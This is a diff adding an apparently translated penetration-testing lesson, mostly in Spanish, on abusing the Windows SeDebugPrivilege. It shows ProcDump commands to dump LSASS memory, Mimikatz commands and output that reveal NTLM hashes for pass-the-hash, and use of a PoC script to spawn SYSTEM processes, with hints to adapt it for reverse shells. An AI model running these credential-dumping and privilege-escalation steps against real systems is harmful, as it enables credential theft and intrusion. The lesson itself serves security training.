@@ -1,0 +1,146 @@
+To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.
+
+Durante una prueba de penetración interna, a menudo es útil utilizar sitios web como LinkedIn para recopilar información sobre posibles usuarios a los que apuntar. Supongamos que estamos, por ejemplo, recuperando muchos hashes de contraseña NTLMv2 utilizando `Responder` o `Inveigh`. En ese caso, es posible que queramos enfocar nuestros esfuerzos de crackeo de hashes en posibles cuentas de alto valor, como desarrolladores que tienen más probabilidades de tener este tipo de privilegios asignados a sus cuentas. Un usuario puede no ser un administrador local en un host pero tener derechos que no podemos enumerar remotamente usando una herramienta como BloodHound. Esto valdría la pena comprobar en un entorno donde obtenemos credenciales para varios usuarios y tenemos acceso RDP a uno o más hosts pero sin privilegios adicionales.
+
+![image](https://academy.hackthebox.com/storage/modules/67/debug.png)
+
+Después de iniciar sesión como un usuario asignado al derecho `Debug programs` y abrir un shell elevado, vemos que `SeDebugPrivilege` está listado.
+
+```r
+C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+```
+
+Podemos usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la suite [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para aprovechar este privilegio y volcar la memoria del proceso. Un buen candidato es el proceso Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)), que almacena credenciales de usuario después de que un usuario inicia sesión en un sistema.
+
+```r
+C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
+[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
+[15:25:46] Dump count reached.
+```
+
+Esto tiene éxito, y podemos cargar esto en `Mimikatz` usando el comando `sekurlsa::minidump`. Después de emitir los comandos `sekurlsa::logonPasswords`, obtenemos el hash NTLM de la cuenta de administrador local iniciada localmente. Podemos usar esto para realizar un ataque de pass-the-hash para movernos lateralmente si se usa la misma contraseña de administrador local en uno o varios sistemas adicionales (común en grandes organizaciones).
+
+Nota: Siempre es una buena idea escribir "log" antes de ejecutar cualquier comando en "Mimikatz", de esta manera todo el output de comando se colocará en un archivo ".txt". Esto es especialmente útil cuando se vuelcan credenciales de un servidor que puede tener muchos conjuntos de credenciales en memoria.
+
+```r
+C:\htb> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+
+Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/31/2021 3:00:57 PM
+SID               : S-1-5-90-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WINLPE-SRV01$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+<SNIP> 
+
+Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+        msv :
+         [00000003] Primary
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+<SNIP>
+
+```
+
+Supongamos que no podemos cargar herramientas en el objetivo por cualquier motivo, pero tenemos acceso RDP. En ese caso, podemos tomar un volcado manual de memoria del proceso `LSASS` a través del Administrador de tareas navegando a la pestaña `Details`, eligiendo el proceso `LSASS` y seleccionando `Create dump file`. Después de descargar este archivo de vuelta a nuestro sistema de ataque, podemos procesarlo usando Mimikatz de la misma manera que en el ejemplo anterior.
+
+![image](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)
+
+---
+
+## Remote Code Execution as SYSTEM
+
+También podemos aprovechar `SeDebugPrivilege` para [RCE](https://decoder.cloud/2018/02/02/getting-system/). Utilizando esta técnica, podemos elevar nuestros privilegios a SYSTEM lanzando un [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) y usando los derechos elevados otorgados a nuestra cuenta a través de `SeDebugPrivilege` para alterar el comportamiento normal del sistema para heredar el token de un [parent process](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) e impersonarlo. Si apuntamos a un proceso padre que se ejecuta como SYSTEM (especificando el ID del proceso (o PID) del proceso o programa en ejecución objetivo), entonces podemos elevar nuestros derechos rápidamente. Veamos esto en acción.
+
+Primero, transfiere este [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) al sistema objetivo. Luego, simplemente cargamos el script y lo ejecutamos con la siguiente sintaxis `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Tenga en cuenta que debemos agregar un tercer argumento en blanco `""` al final para que el PoC funcione correctamente.
+
+El script PoC ha recibido una actualización. Por favor, visite su repositorio en GitHub y revise su uso. https://github.com/decoder-it/psgetsystem
+
+Primero, abre una consola de PowerShell elevada (clic derecho, ejecutar como administrador y escribe las credenciales para el usuario `jordan`). Luego, escribe `tasklist` para obtener una lista de los procesos en ejecución y los PIDs correspondientes.
+
+```r
+PS C:\htb> tasklist 
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          4 K
+System                           4 Services                   0        116 K
+smss.exe                       340 Services                   0      1,212 K
+csrss.exe                      444 Services                   0      4,696 K
+wininit.exe                    548 Services                   0      5,240 K
+csrss.exe                      556 Console                    1      5,972 K
+winlogon.exe                   612 Console                    1     10,408 K
+```
+
+Aquí podemos apuntar a `winlogon.exe` que se ejecuta bajo el PID 612, que sabemos que se ejecuta como SYSTEM en los hosts de Windows.
+
+![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_winlogon.png)
+
+También podríamos usar el cmdlet [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) para obtener el PID de un proceso bien conocido que se ejecuta como SYSTEM (como LSASS) y pasar el PID directamente al script, reduciendo el número de pasos requeridos.
+
+![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)
+
+Existen otras herramientas como [esta](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) para obtener un shell SYSTEM cuando tenemos `SeDebugPrivilege`. A menudo no tendremos acceso RDP a un host, por lo que tendremos que modificar nuestros PoCs para devolver una reverse shell a nuestro host de ataque como SYSTEM u otro comando, como agregar un usuario administrador. Juega con estos PoCs y mira de qué otras maneras puedes obtener acceso a SYSTEM, especialmente si no tienes una sesión completamente interactiva, como cuando logras inyección de comandos o tienes una web shell o conexión de reverse shell como el usuario con `SeDebugPrivilege`. Ten en cuenta estos ejemplos en caso de que alguna vez te encuentres en una situación en la que volcar LSASS no resulte en credenciales útiles (aunque podemos obtener acceso a SYSTEM solo con el hash NTLM de la máquina, pero eso está fuera del alcance de este módulo) y un shell o RCE como SYSTEM sería beneficioso.
